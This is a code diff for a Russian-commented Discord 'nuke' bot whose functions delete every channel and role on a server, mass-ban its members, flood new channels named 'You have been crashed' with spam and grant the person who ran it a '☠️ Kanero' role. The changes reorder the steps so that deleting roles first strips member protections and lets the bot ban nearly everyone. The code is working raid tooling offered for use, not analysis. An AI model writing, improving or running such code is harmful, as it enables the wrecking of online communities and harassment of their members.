@@ -311,41 +311,38 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
     if spam_text is None:
         spam_text = config.SPAM_TEXT
 
-    # Реклама — добавляется всегда, вариативно чтобы Discord не блокировал
     NUKE_NAME = "Вы были крашнуты"
 
-    # ── 1. Удаляем каналы и роли параллельно, сразу начинаем создавать ──
     bot_role = guild.me.top_role
     channels_to_delete = list(guild.channels)
     roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
 
-    import random
+    # ── 1. Удаляем роли и каналы параллельно ──
+    await asyncio.gather(
+        *[c.delete() for c in channels_to_delete],
+        *[r.delete() for r in roles_to_delete],
+        return_exceptions=True
+    )
 
-    async def delete_all():
-        await asyncio.gather(
-            *[c.delete() for c in channels_to_delete],
-            *[r.delete() for r in roles_to_delete],
-            return_exceptions=True
-        )
-
+    # ── 2. Создаём каналы и спамим параллельно ──
     async def create_and_spam(i):
         try:
             if not nuke_running.get(guild.id):
                 return
             ch = await guild.create_text_channel(name=NUKE_NAME)
-            msgs = [ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)]
-            await asyncio.gather(*msgs, return_exceptions=True)
+            await asyncio.gather(
+                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
+                return_exceptions=True
+            )
         except Exception:
             pass
 
-    # Удаление и создание каналов — параллельно
     await asyncio.gather(
-        delete_all(),
         *[create_and_spam(i) for i in range(config.CHANNELS_COUNT)],
         return_exceptions=True
     )
 
-    # ── 4. Создаём роль и выдаём тому кто написал !nuke ──
+    # ── 3. Создаём роль и выдаём запустившему ──
     if caller_id:
         try:
             member = guild.get_member(caller_id)
@@ -353,7 +350,6 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
                 member = await guild.fetch_member(caller_id)
             if member:
                 role = await guild.create_role(name="☠️ Kanero", color=discord.Color.dark_red())
-                # Поднимаем роль как можно выше
                 try:
                     await role.edit(position=max(1, guild.me.top_role.position - 1))
                 except Exception:
@@ -369,48 +365,38 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
 
 
 async def do_superpr_nuke_task(guild, spam_text=None):
-    """
-    Приоритеты:
-    1. Бан участников — оставляет не более 15 человек
-    2. Переименование сервера → CRASH BY ECLIPS
-    3. Удаление всех существующих каналов
-    4. Удаление всех ролей
-    5. Создание новых каналов со спамом
-    """
+    """Super Nuke — удаление ролей/каналов + бан + спам, всё максимально быстро."""
     if spam_text is None:
         spam_text = config.SPAM_TEXT
 
     TURBO_NAME = "Вы были крашнуты"
-
     bot_role = guild.me.top_role
-    # Защищённые ID — никогда не банятся
+
     PROTECTED_IDS = {config.OWNER_ID, 1421778029310509056}
     starter_id = nuke_starter.get(guild.id)
     if starter_id:
         PROTECTED_IDS.add(starter_id)
 
-    # Все кандидаты на бан
-    candidates = [
-        m for m in guild.members
-        if not m.bot and m.id != guild.owner_id
-        and m.id not in PROTECTED_IDS
-        and (not m.top_role or m.top_role < bot_role)
-    ]
-
-    # ── 1. Бан + удаление каналов/ролей + создание каналов — всё параллельно ──
     channels_to_delete = list(guild.channels)
     roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
 
+    # ── 1. Сначала удаляем роли и каналы параллельно ──
+    # Удаление ролей снимает защиту с участников → потом можно банить всех
+    await asyncio.gather(
+        *[c.delete() for c in channels_to_delete],
+        *[r.delete() for r in roles_to_delete],
+        return_exceptions=True
+    )
+
+    # ── 2. Теперь баним всех (роли уже удалены — нет защиты) + создаём каналы параллельно ──
+    candidates = [
+        m for m in guild.members
+        if not m.bot and m.id != guild.owner_id and m.id not in PROTECTED_IDS
+    ]
+
     async def ban_all():
         await asyncio.gather(
-            *[m.ban(reason="super_nuke") for m in to_ban],
-            return_exceptions=True
-        )
-
-    async def delete_all():
-        await asyncio.gather(
-            *[c.delete() for c in channels_to_delete],
-            *[r.delete() for r in roles_to_delete],
+            *[m.ban(reason="super_nuke", delete_message_days=0) for m in candidates],
             return_exceptions=True
         )
 
@@ -426,18 +412,16 @@ async def do_superpr_nuke_task(guild, spam_text=None):
 
     await asyncio.gather(
         ban_all(),
-        delete_all(),
         *[create_and_spam(i) for i in range(config.CHANNELS_COUNT)],
         return_exceptions=True
     )
 
-    # ── Создаём роль и выдаём запустившему ──
-    _starter = nuke_starter.get(guild.id)
-    if _starter:
+    # ── 3. Роль запустившему ──
+    if starter_id:
         try:
-            member = guild.get_member(_starter)
+            member = guild.get_member(starter_id)
             if not member:
-                member = await guild.fetch_member(_starter)
+                member = await guild.fetch_member(starter_id)
             if member:
                 role = await guild.create_role(name="☠️ Kanero", color=discord.Color.dark_red())
                 try:
@@ -455,36 +439,33 @@ async def do_superpr_nuke_task(guild, spam_text=None):
 
 
 async def do_owner_nuke_task(guild, spam_text=None):
-    """
-    Owner Nuke — полный нюк без ограничений.
-    Баним ВСЕХ участников без исключений (кроме ботов и овнера сервера).
-    """
+    """Owner Nuke — полный нюк без ограничений. Максимальная скорость."""
     if spam_text is None:
         spam_text = config.SPAM_TEXT
 
     OWNER_NAME = "Вы были крашнуты"
-
     bot_role = guild.me.top_role
-    targets = [
-        m for m in guild.members
-        if not m.bot and m.id != guild.owner_id
-        and (not m.top_role or m.top_role < bot_role)
-    ]
 
-    # ── 1. Бан + удаление + создание — всё параллельно ──
     channels_to_delete = list(guild.channels)
     roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
 
+    # ── 1. Удаляем роли и каналы параллельно ──
+    # Роли удаляются первыми — снимают защиту со всех участников
+    await asyncio.gather(
+        *[c.delete() for c in channels_to_delete],
+        *[r.delete() for r in roles_to_delete],
+        return_exceptions=True
+    )
+
+    # ── 2. Баним ВСЕХ (роли уже удалены) + создаём каналы параллельно ──
+    targets = [
+        m for m in guild.members
+        if not m.bot and m.id != guild.owner_id
+    ]
+
     async def ban_all():
         await asyncio.gather(
-            *[m.ban(reason="owner_nuke") for m in targets],
-            return_exceptions=True
-        )
-
-    async def delete_all():
-        await asyncio.gather(
-            *[c.delete() for c in channels_to_delete],
-            *[r.delete() for r in roles_to_delete],
+            *[m.ban(reason="owner_nuke", delete_message_days=0) for m in targets],
             return_exceptions=True
         )
 
@@ -500,12 +481,11 @@ async def do_owner_nuke_task(guild, spam_text=None):
 
     await asyncio.gather(
         ban_all(),
-        delete_all(),
         *[create_and_spam(i) for i in range(config.CHANNELS_COUNT)],
         return_exceptions=True
     )
 
-    # ── Создаём роль и выдаём запустившему ──
+    # ── 3. Роль запустившему ──
     _starter = nuke_starter.get(guild.id)
     if _starter:
         try:
